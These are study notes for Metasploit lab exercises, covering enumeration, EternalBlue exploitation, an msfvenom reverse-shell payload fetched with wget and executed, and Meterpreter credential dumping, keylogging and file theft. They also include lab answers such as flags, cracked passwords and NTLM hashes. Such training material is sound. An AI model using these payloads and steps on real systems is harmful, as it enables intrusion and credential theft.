# 🧠 Metasploit – Complete Revision Notes (Exam Ready)

---

## 📌 1. Introduction

- **Metasploit** = Most widely used **exploitation framework**
    
- Used in:
    
    - Information Gathering
        
    - Scanning
        
    - Exploitation
        
    - Post-Exploitation
        

### 🔥 Versions

- **Metasploit Pro** → Paid, GUI
    
- **Metasploit Framework** → Free, CLI (**msfconsole**)
    

---

## 📌 2. Core Components

### 🖥️ msfconsole

- Main interface
    
- Launch:
    

```bash
msfconsole
```

---

### 🧩 Modules (Core of Metasploit)

|Module Type|Purpose|
|---|---|
|**Auxiliary**|Scanning, brute force|
|**Exploit**|Uses vulnerability|
|**Payload**|Runs on target|
|**Post**|After exploitation|
|**Encoder**|Obfuscation|
|**Evasion**|Avoid detection|
|**NOPs**|Buffer padding|

---

## 📌 3. Key Concepts (VERY IMPORTANT ⚠️)

- **Exploit** → Code that uses a vulnerability
    
- **Vulnerability** → Weakness in system
    
- **Payload** → Code executed on target
    

---

## 📌 4. Payload Types

### 🧠 Structure:

```
payloads/
 ├── singles
 ├── stagers
 ├── stages
 └── adapters
```

### 🔹 Types Explained

- **Singles** → Self-contained
    
- **Stagers** → Setup connection
    
- **Stages** → Actual payload
    
- **Adapters** → Convert format
    

---

### ⚡ Trick to Identify Payload Type

|Format|Type|
|---|---|
|`shell_reverse_tcp`|Single|
|`shell/reverse_tcp`|Staged|

---

## 📌 5. msfconsole Basics

### 🔹 Useful Commands

```bash
help
history
clear
```

---

### 🔍 Search Modules

```bash
search apache
search type:auxiliary telnet
search cve:2017
```

---

### 📥 Select Module

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

---

### ⚙️ Show Options

```bash
show options
```

---

### ℹ️ Module Info

```bash
info
```

---

### 🔙 Exit Module

```bash
back
```

---

## 📌 6. Important Parameters

|Parameter|Meaning|
|---|---|
|**RHOSTS**|Target IP|
|**RPORT**|Target port|
|**LHOST**|Your IP|
|**LPORT**|Your port|
|**PAYLOAD**|Payload type|
|**SESSION**|Active connection|

---

### 🔧 Set Values

```bash
set RHOSTS 10.10.x.x
set LPORT 4444
```

---

### 🌍 Global Variables

```bash
setg RHOSTS 10.10.x.x
unsetg RHOSTS
```

---

### ❌ Clear Values

```bash
unset PAYLOAD
unset all
```

---

## 📌 7. Exploitation Phase

```bash
exploit
```

or

```bash
run
```

---

### 🔥 Background Execution

```bash
exploit -z
```

---

## 📌 8. Sessions (VERY IMPORTANT)

### 📊 View Sessions

```bash
sessions
```

---

### 🔗 Interact with Session

```bash
sessions -i 1
```

---

### 🔙 Background Session

```bash
background
```

---

## 📌 9. Workflow (Exam GOLD 🏆)

```text
1. search exploit
2. use module
3. show options
4. set parameters
5. choose payload
6. exploit
7. manage sessions
```

---

## 📌 10. Prompts (IMPORTANT)

|Prompt|Meaning|
|---|---|
|`msf6 >`|Main console|
|`msf6 exploit(...) >`|Module context|
|`meterpreter >`|Advanced shell|
|`C:\>`|Target shell|

---

## 📌 11. Real Example (EternalBlue)

- Exploit: `ms17_010_eternalblue`
    
- Used in:
    
    - **WannaCry ransomware attack**
        

---

## ⚡ Quick Revision (1 Minute Before Exam)

- Exploit → uses vulnerability
    
- Payload → runs on target
    
- Singles → self-contained
    
- `_` = Single | `/` = Staged
    
- `unset payload` → clear payload
    
- `exploit` → run attack
    
- `setg` → global variable
    
- `sessions -i` → interact
    

---

# 🧠 Metasploit + Nmap Enumeration Lab (CEH / TryHackMe Notes)

---

# 🎯 Objective

Perform:

- Port Scanning
    
- Service Enumeration
    
- NetBIOS Enumeration
    
- SMB Brute Force
    

---

# 🔍 1. Port Scanning

## 📌 Using Nmap

```bash
nmap -sS <TARGET_IP>
```

### ✅ Output

```
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8000/tcp open  http-alt
```

### ✔ Result

- Total Open Ports = **5**
    

---

## 📌 Using Metasploit

### Search port scan modules:

```bash
search portscan
```

### Common Modules:

- `auxiliary/scanner/portscan/tcp`
    
- `auxiliary/scanner/portscan/syn`
    
- `auxiliary/scanner/portscan/ack`
    
- `auxiliary/scanner/portscan/xmas`
    

---

### Run TCP Scan:

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS <TARGET_IP>
run
```

---

# 🌐 2. NetBIOS Enumeration

## 📌 Using Nmap Script

```bash
nmap -sU -p 137 --script nbstat.nse <TARGET_IP>
```

### ✅ Output:

```
ACME IT SUPPORT<00>
```

### ✔ NetBIOS Name:

```
ACME IT SUPPORT
```

---

## 📌 Using Metasploit (UDP Sweep)

```bash
use auxiliary/scanner/discovery/udp_sweep
set RHOSTS <TARGET_IP>
run
```

### 🔥 Key Finding:

```
ACME IT SUPPORT
```

---

# ⚠️ Common Mistakes

- ❌ Running `nbtscan` inside msfconsole
    
- ❌ Using `<TARGET_IP>` literally instead of actual IP
    
- ❌ Not setting `RHOSTS`
    

---

# 🖥️ 3. Service Version Detection

## 📌 Command:

```bash
nmap -sC -sV -p 8000 <TARGET_IP>
```

### ✅ Output:

```
WebFS httpd 1.21
```

### ✔ Answer:

```
webfs/1.21
```

---

# 🔐 4. SMB Enumeration

## 📌 Check SMB Version

```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS <TARGET_IP>
run
```

### ✅ Output:

```
SMBv2 / SMBv3 detected
```

---

## ⚠️ Important Concept

|SMB Version|Tool Support|
|---|---|
|SMBv1|Hydra ✅|
|SMBv2/v3|Hydra ❌|

👉 Target uses **SMBv2/SMBv3 → Hydra fails**

---

# 💥 5. SMB Brute Force (Correct Method)

## 📌 Use Metasploit smb_login

```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS <TARGET_IP>
set SMBUser penny
set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
run
```

---

### ✅ Output:

```
Success: '.\penny:leo1234'
```

### ✔ Password:

```
leo1234
```

---

# 🚫 Failed Attempts (Important Learning)

## ❌ Hydra Failure

```bash
hydra -l penny -P wordlist smb://IP
```

### Error:

```
does not support SMBv1
```

---

## ❌ SMB2 Hydra Attempt

```bash
hydra smb2://
```

### Error:

```
Unknown service: smb2
```

---

## ❌ CrackMapExec inside msfconsole

```
Unknown command
```

👉 Must run in **normal terminal**

---

# 🧠 Key Exam Concepts

## 🔥 Tool Usage Mapping

|Task|Tool|
|---|---|
|Port Scan|Nmap / Metasploit|
|NetBIOS|nbstat / nmap script|
|Service Version|nmap -sV|
|SMB Enum|smb_version|
|SMB Bruteforce|smb_login / CME|

---

## ⚡ Golden Rules

- Always set `RHOSTS` in Metasploit
    
- Do NOT run external tools inside msfconsole
    
- Use `-sV` for service detection
    
- SMBv2/v3 → use smb_login (NOT Hydra)
    

---

# 📊 Final Answers Summary

|Question|Answer|
|---|---|
|Open Ports|5|
|NetBIOS Name|ACME IT SUPPORT|
|Port 8000 Service|webfs/1.21|
|SMB Password|leo1234|

---

# 🚀 Quick Revision (Before Exam)

```
nmap -sS IP
nmap -sU -p 137 --script nbstat.nse IP
nmap -sC -sV -p 8000 IP

use smb_version
use smb_login
```

---

# 💡 Pro Tip

👉 If Hydra fails in SMB → immediately switch to:

- `smb_login` (Metasploit)
    
- `crackmapexec` (terminal)
    

---

# 🏁 Conclusion

This lab demonstrates:

- Real-world enumeration workflow
    
- Tool limitations (Hydra vs SMBv2)
    
- Correct tool selection strategy
    

👉 **Focus on logic, not commands — that’s what exams test.**

---

# 🗄️ Metasploit Database (msfdb)

## 📌 Overview

- Used for **project management in penetration testing**
- Helps handle:
    - Multiple targets
    - Scan results
    - Credentials
    - Services & vulnerabilities
- Prevents confusion when working on **large engagements**

---

## ⚙️ Database Setup (Kali / Local Setup)

### 1️⃣ Start PostgreSQL

`systemctl start postgresql`

### 2️⃣ Initialize Database

`sudo -u postgres msfdb init`

### ❗ Important Notes

- ❌ Do NOT run `msfdb init` as root
- ✔ Use `postgres` user
- Reset DB if needed:

`sudo -u postgres msfdb delete`

---

## ✅ Verify Database Connection

`db_status`

✔ Output:

`[*] Connected to msf. Connection type: postgresql.`

---

# 🧠 Workspaces (Project Isolation)

## 📌 Purpose

- Separate different pentesting projects
- Avoid mixing results

---

## 📋 Workspace Commands

### List Workspaces

`workspace`

### Add Workspace

`workspace -a tryhackme`

### Switch Workspace

`workspace tryhackme`

### Delete Workspace

`workspace -d tryhackme`

### Help

`workspace -h`

---

## 🔥 Key Insight

- Active workspace marked with `*`
- Each workspace has its **own database context**

---

# 🗃️ Database Backend Commands

## 📌 Core Commands

|Command|Purpose|
|---|---|
|db_status|Check DB connection|
|db_nmap|Run Nmap & store results|
|hosts|List discovered hosts|
|services|List services|
|vulns|List vulnerabilities|
|loot|Stored data|
|notes|Notes|
|db_import|Import scan|
|db_export|Export data|

---

# 🔍 Using db_nmap (IMPORTANT)

## 📌 Command

`db_nmap -sV -p- <TARGET_IP>`

## ✅ Features

- Runs Nmap
- Automatically saves:
    - Open ports
    - Services
    - OS info

---

## 📊 Example Output Stored

### Hosts

`hosts`

### Services

`services`

---

## 🔥 Pro Tip

`hosts -R`

➡️ Automatically sets:

`RHOSTS = all discovered targets`

---

# ⚡ Practical Workflow (VERY IMPORTANT)

## 🧩 Step-by-Step Flow

Diagram

`graph TD A[db_nmap scan] --> B[hosts/services stored] B --> C[hosts -R] C --> D[Select module] D --> E[Run scan/exploit]`

---

## 🧪 Example: MS17-010 Scan

`use auxiliary/scanner/smb/smb_ms17_010 hosts -R show options run`

---

# 🔎 Service Filtering

## 📌 Search Specific Services

`services -S netbios`

---

# 🎯 Low Hanging Fruits (Exam Concept)

## 📌 Definition

- Easily exploitable vulnerabilities
- Quick initial access points

---

## 🔥 Common Targets

|Service|Possible Attack|
|---|---|
|HTTP|SQLi, RCE|
|FTP|Anonymous login|
|SMB|MS17-010|
|SSH|Weak credentials|
|RDP|BlueKeep|

---

# 🔍 Vulnerability Scanning in Metasploit

## 📌 Key Idea

- Based on:
    - Enumeration
    - Fingerprinting
- Better recon = better exploits

---

# 🖥️ VNC Scanning

## 📌 Available Modules

`use auxiliary/scanner/vnc/`

Examples:

- `vnc_login`
- `vnc_none_auth`
- `ard_root_pw`

---

## 🔐 VNC Login Scanner

`use auxiliary/scanner/vnc/vnc_login info`

### Key Options

|Option|Description|
|---|---|
|RHOSTS|Target|
|RPORT|Default 5900|
|USERNAME|Login user|
|PASS_FILE|Password list|
|BRUTEFORCE_SPEED|Speed|
|STOP_ON_SUCCESS|Stop after success|

---

## 🧠 Insight

- Can brute-force VNC credentials
- Uses **RFB protocol**

---

# 📧 SMTP Open Relay Detection

## 🔍 Search Module

`search smtp relay`

---

## 📌 Module

`use auxiliary/scanner/smtp/smtp_relay`

---

## 🧾 Module Info

### 👨‍💻 Author

👉 **Campbell Murray**

---

## ⚙️ Options

|Option|Description|
|---|---|
|RHOSTS|Target|
|RPORT|25|
|MAILFROM|Sender|
|MAILTO|Receiver|
|EXTENDED|Advanced checks|

---

## 📌 Function

- Checks if SMTP server:
    - Accepts unauthorized email relay
- Uses multiple test techniques

---

# 🧠 Key Concepts Summary

## 🔥 Why Metasploit DB is Powerful

- Centralized data storage
- Faster exploitation workflow
- Automation of recon → attack

---

## ⚡ Real Pentest Flow

1. Scan network → `db_nmap`
2. Analyze → `hosts`, `services`
3. Filter targets → `services -S`
4. Load modules → `use`
5. Auto-set targets → `hosts -R`
6. Run exploit/scanner

---

# 🚨 Common Mistakes (From Your Logs)

- ❌ Forgetting `RHOSTS`
- ❌ Running tools inside msfconsole incorrectly (like hydra, nbtscan)
- ❌ Using wrong protocol (SMBv1 vs SMBv2)
- ❌ Not using database (manual repetition)

---

# 🧠 Exam Quick Revision

- `msfdb init` → initialize DB
- `db_status` → check connection
- `workspace -a` → create project
- `db_nmap` → scan + save
- `hosts -R` → auto set target
- `services -S` → filter services
- `smtp_relay` → open relay detection
- **Author → Campbell Murray**

# 🧨 Exploitation with Metasploit (MS17-010 EternalBlue)

## 📌 Overview

- Metasploit is an **exploitation framework**
- Exploits are the **largest module category**
- Success depends on:
    - Target enumeration
    - Service understanding
    - Correct payload selection

---

## ⚙️ Metasploit Stats

`=[ metasploit v5.0.101-dev] + -- --=[ 2048 exploits - 1105 auxiliary - 344 post] + -- --=[ 562 payloads - 45 encoders - 10 nops] + -- --=[ 7 evasion]`

---

## 🔍 Basic Exploitation Workflow

### 1️⃣ Search Exploit

`search ms17_010`

### 2️⃣ Use Exploit

`use exploit/windows/smb/ms17_010_eternalblue`

### 3️⃣ Show Options

`show options`

### 4️⃣ Set Target

`set RHOSTS <target-ip>`

---

## 🎯 Payload Selection

### 📌 View Payloads

`show payloads`

### Example Payload Types

|Payload|Description|
|---|---|
|generic/shell_reverse_tcp|Basic reverse shell|
|windows/x64/meterpreter/reverse_tcp|Advanced control|
|windows/x64/exec|Execute command|

---

### 📌 Set Payload

`set payload windows/x64/meterpreter/reverse_tcp`

---

## ⚙️ Payload Configuration

### Required Options

`set LHOST <your-ip> set LPORT 4444`

👉 Your correct LHOST (from `ip a`):

`10.49.127.55`

---

## 🚀 Running the Exploit

`exploit`

---

## ⚠️ Important Notes

- Exploit may **fail multiple times** (normal for EternalBlue)
- Reasons:
    - Memory layout instability
    - Firewall/AV
    - Payload incompatibility

---

## ✅ Successful Exploitation Output

`Meterpreter session 1 opened`

---

# 🖥️ Working with Sessions

## 📌 List Sessions

`sessions`

## 📌 Interact with Session

`sessions -i 1`

## 📌 Background Session

`CTRL + Z`

---

## ⚙️ Sessions Commands

`sessions -l        # list sessions -i <id>   # interact sessions -k <id>   # kill sessions -u <id>   # upgrade shell`

---

# 🧪 Meterpreter Post-Exploitation

## 📂 File Search

`search -f flag.txt`

## 📄 Read File

`cat C:/Users/Jon/Documents/flag.txt`

### ✅ Flag

`THM-5455554845`

---

## 🔐 Privilege Escalation

`getsystem`

✔ Output:

`Already running as SYSTEM`

---

## 🔑 Dump Password Hashes

`hashdump`

### Output:

`Administrator:500:...:31d6cfe0d16ae931b73c59d7e0c089c0 Guest:501:...:31d6cfe0d16ae931b73c59d7e0c089c0 pirate:1001:...:8ce9a3ebd1647fcc5e04025019f4b875`

---

## 🎯 Final Answers

### 📌 Flag Content

`THM-5455554845`

### 📌 NTLM Hash (pirate user)

`8ce9a3ebd1647fcc5e04025019f4b875`

---

# 🧠 Key Learnings

- EternalBlue is **unstable → retry required**
- Correct **LHOST is critical** (your real interface IP)
- Payload choice impacts success rate
- Meterpreter gives:
    - File access
    - Privilege escalation
    - Credential dumping

---

# ⚡ Pro Tips (Exam + Real World)

- Always verify:
    
    `show options`
    
- Use Meterpreter over basic shell when possible
- If exploit fails:
    - Retry
    - Change payload
    - Check network/LHOST
---

# 🛠️ Metasploit Workflow (MSFvenom + Multi-Handler) — Linux

## 🎯 Objective

- Gain **Meterpreter session**
    
- Perform **post-exploitation (hash dumping)**
    

---

# 🧠 Complete Attack Flow (Diagram)

```
┌──────────────┐
│  Attacker    │
│ (Kali Linux) │
└──────┬───────┘
       │
       │ 1. msfvenom (create payload)
       ▼
┌──────────────────────┐
│ rev_shell.elf        │
│ (malicious payload)  │
└──────┬───────────────┘
       │
       │ 2. Host via HTTP
       ▼
┌──────────────────────┐
│ Python HTTP Server   │
│ port 9000            │
└──────┬───────────────┘
       │
       │ 3. Victim downloads
       ▼
┌──────────────┐
│   Victim     │
│  (Ubuntu)    │
└──────┬───────┘
       │
       │ 4. Execute payload
       ▼
┌────────────────────────┐
│ Reverse Connection     │
│ to Attacker (LHOST)    │
└──────┬─────────────────┘
       │
       │ 5. Caught by
       ▼
┌────────────────────────┐
│ Metasploit Handler     │
│ (multi/handler)        │
└──────┬─────────────────┘
       │
       ▼
┌────────────────────────┐
│ Meterpreter Session    │
│ (Shell Access)         │
└────────────────────────┘
```

---

# 1️⃣ Payload Generation

```
Attacker → Creates Payload
```

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.48.101.212 LPORT=4444 -f elf > rev_shell.elf
```

### 📌 Diagram

```
[ msfvenom ]
     │
     ▼
[ rev_shell.elf ]
```

---

# 2️⃣ Payload Delivery

```bash
python3 -m http.server 9000
```

### 📌 Diagram

```
Attacker (Server:9000)
        │
        ▼
Victim → wget payload
```

---

# 3️⃣ Listener Setup

```bash
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 10.48.101.212
set LPORT 4444
run
```

### 📌 Diagram

```
[ Handler Waiting ]
        │
        ▼
Listening on 4444
```

---

# 4️⃣ Execution on Victim

```bash
wget http://10.48.101.212:9000/rev_shell.elf
chmod +x rev_shell.elf
./rev_shell.elf
```

### 📌 Diagram

```
Victim executes file
        │
        ▼
Reverse TCP Connection
        │
        ▼
Attacker (4444)
```

---

# 🔥 Connection Flow (Important Diagram)

```
Victim  ───────────────► Attacker
        Reverse Shell

Port: 4444
Protocol: TCP
```

---

# 🚩 Meterpreter Session

```
[ Session Opened ]
        │
        ▼
meterpreter >
```

---

# 📂 Post-Exploitation Flow

```
Meterpreter
     │
     ├── ls
     ├── cat /etc/shadow
     └── hashdump
```

---

# 🔐 Hash Dumping Diagram

```
┌──────────────┐
│ Meterpreter  │
└──────┬───────┘
       │
       ▼
┌────────────────┐
│ /etc/shadow    │
│ Password Hash  │
└──────┬─────────┘
       │
       ▼
┌──────────────────────────────┐
│ claire:$6$hash_value...      │
└──────────────────────────────┘
```

---

# 🧠 Hash Type Identification

```
$1$ → MD5
$5$ → SHA-256
$6$ → SHA-512  ✅
```

---

# ⚡ Full Exploitation Pipeline (Exam Diagram)

```
[ msfvenom ]
      │
      ▼
[ Payload (.elf) ]
      │
      ▼
[ HTTP Server ]
      │
      ▼
[ Victim Download ]
      │
      ▼
[ Execute Payload ]
      │
      ▼
[ Reverse Shell ]
      │
      ▼
[ Multi/Handler ]
      │
      ▼
[ Meterpreter ]
      │
      ▼
[ Hash Dumping ]
```

---

# ⚠️ Common Issues (Debug Diagram)

```
❌ No Session?
   │
   ├── Wrong LHOST
   ├── Firewall Block
   ├── Payload mismatch
   └── Wrong architecture
```

---

# 📊 Quick Reference Table

|Target|Format|Extension|
|---|---|---|
|Windows|exe|.exe|
|Linux|elf|.elf|
|Web|php|.php|
|Android|raw|.apk|

---

# 🧠 Pro Tips (Visual)

```
✔ Match payload (VERY IMPORTANT)
✔ Start listener BEFORE execution
✔ Check IP using: ip a
✔ Use correct architecture (x86/x64)
✔ Ensure port is open
```

---
# 🧠 Metasploit: Meterpreter 

---

## 📌 1. Meterpreter Overview

**Meterpreter** is a powerful payload of the Metasploit Framework used for **post-exploitation**.

### 🔑 Key Points

- Runs on **target system**
    
- Acts as **C2 (Command & Control) agent**
    
- Allows:
    
    - File access
        
    - System control
        
    - Credential extraction
        

---

## ⚙️ Meterpreter Workflow (High-Level)

```
[Exploit Executed]
        │
        ▼
[Meterpreter Payload Delivered]
        │
        ▼
[Session Opened]
        │
        ▼
[Post-Exploitation Phase]
        │
        ├── Enumeration
        ├── File Access
        ├── Credential Dumping
        └── Privilege Escalation
```

---

## 🧰 2. Meterpreter Commands (Important)

👉 Always run:

```bash
help
```

---

### 🔹 Core Commands

```bash
background   # Send session to background
sessions     # Switch sessions
migrate      # Move to another process
load         # Load extensions
run          # Execute modules/scripts
exit         # Close session
```

---

### 📁 File System Commands

```bash
ls           # List files
cd           # Change directory
pwd          # Show current path
cat file.txt # Read file
edit file    # Edit file
rm file      # Delete file
search -f file.txt
upload file
download file
```

---

### 🌐 Networking Commands

```bash
ifconfig
netstat
arp
route
portfwd
```

---

### ⚙️ System Commands

```bash
sysinfo      # OS details
getuid       # Current user
getpid       # Process ID
ps           # Running processes
execute      # Run command
shell        # Open system shell
reboot
shutdown
```

---

### 🔐 Privilege & Credentials

```bash
getsystem    # Privilege escalation
hashdump     # Dump password hashes
```

---

### 🎯 Monitoring / Surveillance

```bash
keyscan_start
keyscan_dump
screenshot
screenshare
webcam_snap
record_mic
```

---

## 🔓 3. Post-Exploitation Practical Flow

---

### 🧩 Step-by-Step Attack Flow

```
[Initial Access via SMB]
        │
        ▼
[Meterpreter Session]
        │
        ├── sysinfo → System Info
        ├── getuid → Privilege Check
        ├── search → Find files
        ├── cat → Read files
        ├── hashdump → Dump hashes
        └── modules → Advanced enumeration
```

---

## ⚔️ 4. Exploitation Setup (SMB Example)

```bash
use exploit/windows/smb/psexec

set RHOSTS <TARGET_IP>
set SMBUser ballen
set SMBPass Password1

exploit
```

---

## 📊 5. Enumeration & Answers (CTF Based)

---

### 🖥️ System Info

```bash
sysinfo
```

|Question|Answer|
|---|---|
|Computer Name|ACME-TEST|
|Domain|FLASH|

---

### 📂 Share Enumeration

```bash
use post/windows/gather/enum_shares
set SESSION 1
run
```

|Result|
|---|
|speedster|

---

### 🔐 Credential Dumping

```bash
hashdump
```

|User|NTLM Hash|
|---|---|
|jchambers|69596c7aa1e8daee17f8e78870e25a5c|

---

### 🔓 Password Cracking

👉 Use:

- CrackStation / Rainbow Tables
    

|User|Password|
|---|---|
|jchambers|Trustno1|

---

## 📁 6. File Discovery & Secrets

---

### 🔍 Find Sensitive Files

```bash
search -f secrets.txt
```

📍 Path:

```
c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt
```

---

### 📖 Read File

```bash
cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
```

🔑 Extracted:

```
Twitter Password → KDSvbsw3849!
```

---

### 🔍 Find Final Secret

```bash
search -f realsecret.txt
```

📍 Path:

```
c:\inetpub\wwwroot\realsecret.txt
```

---

### 📖 Read Final Secret

```bash
cat "c:\inetpub\wwwroot\realsecret.txt"
```

🎯 Result:

```
The Flash is the fastest man alive
```

---

## 🧠 Complete Post-Exploitation Diagram

```
                [Meterpreter Session]
                         │
        ┌────────────────┼────────────────┐
        ▼                ▼                ▼
  [System Info]    [File Discovery]   [Credentials]
    sysinfo          search           hashdump
    getuid           cat              cracking
        │                │                │
        ▼                ▼                ▼
   ACME-TEST       secrets.txt       NTLM Hash
   FLASH           realsecret.txt    Password
```

---

## ⚠️ Important Tips (Exam + Practical)

✔ Always:

- Run `sysinfo` first
    
- Check privilege with `getuid`
    
- Use `search` aggressively
    
- Dump hashes early
    

✔ Common Mistakes:

- Not setting SESSION in modules
    
- Wrong file path format (`\` vs `/`)
    
- Forgetting quotes in paths with spaces
    

---

## 🧠 Final Summary

- Meterpreter = **Post-exploitation toolkit**
    
- Provides:
    
    - System control
        
    - Credential access
        
    - File discovery
        
- Key commands:
    
    - `sysinfo`, `search`, `hashdump`, `cat`
        

---
